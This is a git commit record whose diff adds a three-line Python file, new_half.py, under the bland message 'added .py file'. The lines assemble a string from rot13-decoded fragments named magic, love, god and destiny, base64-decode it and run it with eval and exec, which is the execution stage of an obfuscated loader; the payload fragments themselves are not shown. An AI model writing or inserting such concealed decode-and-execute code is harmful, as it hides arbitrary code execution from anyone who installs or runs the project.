e45c4978e7392c6386cb380b944f3621505dfc82
pavel <pavelkocozlov@yandex.ru>
2022-03-30 12:53:14 +0300

    added .py file

---
+++ new_half.py
@@ -0,0 +1,3 @@
+joy = 'rot13'		
+trust = eval('magic') + eval('codecs.decode(love, joy)') + eval('god') + eval('codecs.decode(destiny, joy)')		
+eval(compile(base64.b64decode(eval('trust')),'<string>','exec'))
